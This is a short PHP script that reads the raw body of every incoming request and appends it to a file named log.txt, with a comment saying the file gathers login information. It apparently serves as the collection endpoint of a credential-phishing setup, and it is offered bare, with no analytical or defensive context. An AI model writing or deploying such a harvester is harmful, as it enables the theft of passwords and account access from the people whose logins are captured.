<?php
$o = fopen("php://input", "r");
$str = stream_get_contents($o);
fclose($o);

$t = fopen("log.txt", "a+");   // get information one "log.txt ", login information
fwrite($t, $str);
fclose($t);
?>
